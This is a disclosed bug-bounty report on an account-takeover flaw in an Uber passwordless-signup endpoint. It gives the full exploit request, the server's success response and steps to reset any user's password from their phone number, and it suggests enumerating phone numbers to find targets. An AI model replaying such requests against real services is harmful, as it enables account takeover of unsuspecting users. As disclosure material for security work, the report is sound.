# Change any Uber user's password through /rt/users/passwordless-signup - Account Takeover (critical)

## Report Details
- **Report ID**: 143717
- **URL**: https://hackerone.com/reports/143717
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-06-08T16:31:39.368Z
- **Disclosed**: 2016-07-14T21:38:20.440Z

## Reporter
- **Username**: mongo
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: uber

## Vulnerability Information
Through the endpoint at /rt/users/passwordless-signup it is possible to change the password of any Uber user, given knowledge of their phone number (or by just enumerating phone numbers until one is found that is registered with Uber - not too hard given the number of Uber users).

I've tested this with Riders, the same might apply to Drivers or other user roles.

# Request/response

Here is the request used (I've censored out my phone number):
```
POST /rt/users/passwordless-signup HTTP/1.1
Host: cn-geo1.uber.com
User-Agent: client/iphone/2.137.1
Connection: close
Content-Type: application/json
Content-Length: 197

{"phoneNumberE164":"+xxxxxxxx","userWorkflow":"PASSWORDLESS_SIGNUP","userRole":"client","mobileCountryISO2":"XX","state":"CREATE_NEW_PASSWORD","newPasswordData":{"newPassword":"12345678911a!"}}
```

And the response:
```
{"phoneNumberE164":"+xxxxxxxx","serverState":"SUCCEEDED","serverStateData":{"nextState":"SIGN_IN"},"tripVerifyStateData":{},"userMessage":"New password has been created. Please login with the new Password.","userRole":"client","userWorkflow":"PASSWORDLESS_SIGNUP"}
```

# To replicate
1. Create a new Rider account (I used the iOS app, but this probably does not matter).
2. Replay the request shown above, changing the phoneNumberE164 field with the phone number you associated with your account (including country prefix and the plus sign, for example, +1xxx for US). You might need to replay it twice. You'll eventually get the "New password has been created." message; the new password has been set. The new password will be whatever you specified in the newPassword field in the request.
3. Login using the new password on http://riders.uber.com/ or elsewhere.

## Attachments
No attachments
